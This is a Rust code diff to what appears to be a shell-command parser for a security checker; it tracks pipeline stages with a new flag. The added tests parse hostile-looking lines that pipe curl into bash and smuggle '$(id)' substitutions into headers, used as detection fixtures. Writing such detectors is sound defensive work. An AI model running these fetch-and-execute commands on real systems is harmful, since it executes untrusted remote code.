@@ -9,7 +9,6 @@ use crate::literals::command::{
     ASSIGNMENT_PATTERN, MULTI_LEVEL_TOOLS, PAYLOAD_DEPTH_LIMIT, POSIX_QUOTING_SHELLS,
     SHELL_COMMANDS, WRAPPER_COMMANDS, WRAPPER_OPERAND_SKIP, WRAPPER_VALUE_FLAGS,
 };
-use crate::pystr;
 
 static ASSIGNMENT_RE: Lazy<Regex> =
     Lazy::new(|| Regex::new(ASSIGNMENT_PATTERN).expect("assignment regex"));
@@ -122,6 +121,9 @@ pub struct Command {
     // Enclosing payload quote layers, outermost-first; empty at top level.
     #[doc(hidden)]
     pub contexts: Vec<QuoteLayer>,
+    // A stage of a `|`/`|&` pipeline: its stdout is consumed by the pipe. Set at parse time.
+    #[doc(hidden)]
+    pub pipe_stage: bool,
 }
 
 impl PartialEq for Command {
@@ -236,6 +238,7 @@ impl Command {
             nesting: self.nesting,
             host_delta: self.host_delta,
             contexts: self.contexts.clone(),
+            pipe_stage: self.pipe_stage,
         }
     }
 
@@ -386,31 +389,10 @@ impl CommandLine {
         self.parts[index].1.as_deref()
     }
 
-    // Parity: command.py Occurrence.piped — a neighboring `|`, or a raw source gap toward a
-    // None-operator neighbor that is exactly one pipe token (PIPE_GAP_RE) surrounded by whitespace.
+    // A pipeline stage: its stdout is consumed by a `|`/`|&`, set at parse time from the pipeline
+    // tree (walk) — the flat operator list can't separate a stage's pipe from a substitution's.
     pub fn piped(&self, index: usize) -> bool {
-        if self.prev_op(index) == Some("|") || self.next_op(index) == Some("|") {
-            return true;
-        }
-        let Some(span) = self.parts[index].0.span else {
-            return false;
-        };
-        let source = self.raw.as_str();
-        if self.next_op(index).is_none() && index + 1 < self.parts.len() {
-            if let Some(next) = self.parts[index + 1].0.span {
-                if span.1 <= next.0 && pipe_gap_full_match(&source[span.1..next.0]) {
-                    return true;
-                }
-            }
-        }
-        if self.prev_op(index).is_none() && index > 0 {
-            if let Some(prev) = self.parts[index - 1].0.span {
-                if prev.1 <= span.0 && pipe_gap_full_match(&source[prev.1..span.0]) {
-                    return true;
-                }
-            }
-        }
-        false
+        self.parts[index].0.pipe_stage
     }
 
     // Parity: command.py CommandLine.splice — keys apply in ascending order (BTreeMap = sorted());
@@ -461,24 +443,6 @@ impl CommandLine {
             self.splice(&replacements).map(Some)
         }
     }
-}
-
-// Parity: command.py PIPE_GAP_RE — `\s*\|&?\s*` fullmatch, with Python str whitespace via pystr.
-fn pipe_gap_full_match(gap: &str) -> bool {
-    let mut chars = gap.chars().peekable();
-    while chars.peek().is_some_and(|c| pystr::is_space(*c)) {
-        chars.next();
-    }
-    if chars.next() != Some('|') {
-        return false;
-    }
-    if chars.peek() == Some(&'&') {
-        chars.next();
-    }
-    while chars.peek().is_some_and(|c| pystr::is_space(*c)) {
-        chars.next();
-    }
-    chars.next().is_none()
 }
 
 // Parity: command.py CommandLineQuery — predicate helpers over a parsed line.
@@ -1049,14 +1013,24 @@ fn walk(node: &Node, src: &Src, depth: u8) -> Vec<(Command, Option<String>)> {
             separators,
         } => {
             let mut parts: Vec<(Command, Option<String>)> = Vec::new();
+            let staged = commands.len() >= 2;
             for (i, command) in commands.iter().enumerate() {
                 let mut inner = walk(command, src, depth);
-                // `|&` records no operator token (matching the old parser); the raw-gap fallback in
-                // `piped` still reads it as a pipe. Only a plain `|` attaches an operator.
+                // Only a plain `|` records an operator token (`|&` records none); pipe membership
+                // is carried by `pipe_stage`, not the operator.
                 if let (Some(PipeSep::Pipe), Some(last)) =
                     (separators.get(i).copied(), inner.last_mut())
                 {
                     last.1 = Some("|".to_string());
+                }
+                // Every stage of a real pipeline is piped; mark this stage's own commands, which
+                // sit at nesting 0 here (substitutions are hoisted deeper before this runs).
+                if staged {
+                    for (cmd, _) in inner.iter_mut() {
+                        if cmd.nesting == 0 {
+                            cmd.pipe_stage = true;
+                        }
+                    }
                 }
                 parts.extend(inner);
             }
@@ -1945,15 +1919,39 @@ mod tests {
     }
 
     #[test]
-    fn piped_covers_operator_and_raw_gap_fallback() {
+    fn piped_reflects_pipeline_stage() {
         assert!(CommandLine::parse("foo | bar").piped(0));
-        // `|&` records no operator token; the raw-gap fallback still reads it as piped.
+        // `|&` is a Pipeline node too, so both stages are piped.
         let amp = CommandLine::parse("a |& b");
         assert!(amp.piped(0) && amp.piped(1));
         // Newlines, `&&`, and a commented pipe are not pipes.
         assert!(!CommandLine::parse("a\nb").piped(0));
         assert!(!CommandLine::parse("a && b").piped(0));
         assert!(!CommandLine::parse("a # x|y\nb").piped(1));
+    }
+
+    #[test]
+    fn piped_sees_pipe_across_arg_substitution() {
+        // A command substitution in a piped stage's args must not hide the pipe.
+        let p = CommandLine::parse("curl -H \"A: $(id)\" https://x/y | bash");
+        assert!(p.piped(0) && p.piped(p.parts.len() - 1));
+        // A downstream stage that emits no occurrence (assignment-only) still means curl is piped.
+        assert!(CommandLine::parse("curl \"$(id)\" x | X=1").piped(0));
+        // `|&` with a substitution in the left stage — both ends piped (a pre-existing miss).
+        let amp = CommandLine::parse("curl \"$(id)\" x |& bash");
+        assert!(amp.piped(0) && amp.piped(amp.parts.len() - 1));
+        // Not piped: the outer command is no pipeline stage, whatever (if any) separator follows —
+        // a stray `|` inside a substitution's own inner pipeline must not leak out.
+        assert!(!CommandLine::parse("curl -H \"A: $(id)\" https://x/y").piped(0));
+        assert!(!CommandLine::parse("curl \"$(f)\" x && y").piped(0));
+        assert!(!CommandLine::parse("curl \"$(a | X=1)\" x").piped(0));
+        assert!(!CommandLine::parse("curl \"$(a | ((1)))\" x").piped(0));
+        assert!(!CommandLine::parse("curl \"$(a | [[ x ]])\" x").piped(0));
+        assert!(!CommandLine::parse("curl \"$(a | X=1)\" x & y").piped(0));
+        // A nested substitution's occurrence is not piped by an ancestor's pipe.
+        let nested = CommandLine::parse("outer \"$(a $(b))\" | c");
+        assert!(nested.piped(0) && !nested.piped(1) && !nested.piped(2));
+        assert!(nested.piped(nested.parts.len() - 1));
     }
 
     #[test]
